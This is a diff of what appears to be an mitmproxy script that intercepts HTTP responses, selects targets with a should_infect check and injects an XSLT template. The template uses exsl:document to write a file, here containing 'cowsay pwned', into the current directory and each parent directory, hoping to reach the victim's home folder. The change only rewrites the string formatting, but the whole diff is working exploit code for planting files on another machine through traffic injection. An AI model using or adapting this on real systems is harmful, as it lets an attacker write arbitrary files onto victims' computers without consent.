@@ -28,20 +28,17 @@ file_data = 'cowsay pwned\n'
 # FIXME: I couldn't find a way to determine home directory with XSL.
 # Oh well, let's hope cwd is within $HOME, and try ".", "..", "../.."
 # and so on.
-code = r'''
+code = fr'''
 <xsl:template name="pwn.recursive">
     <xsl:param name="dir" select="'.'"/>
     <xsl:if test="string-length($dir) &lt; 100">
-        <exsl:document href="{{$dir}}/{name}" method="text">{data}</exsl:document>
+        <exsl:document href="{{$dir}}/{saxutils.escape(file_name)}" method="text">{saxutils.escape(file_data)}</exsl:document>
         <xsl:call-template name="pwn.recursive">
             <xsl:with-param name="dir" select="concat($dir, '/..')"/>
         </xsl:call-template>
     </xsl:if>
 </xsl:template>
-'''.format(
-    name=saxutils.escape(file_name),
-    data=saxutils.escape(file_data),
-)
+'''
 
 def should_infect(url):
     return (
@@ -60,7 +57,7 @@ def response(flow):
     )
     text = re.sub(
         '(<xsl:template match="/">)',
-        r'{code}\1\n<xsl:call-template name="pwn.recursive"/>\n'.format(code=code),
+        fr'{code}\1\n<xsl:call-template name="pwn.recursive"/>\n',
         text
     )
     flow.response.text = text
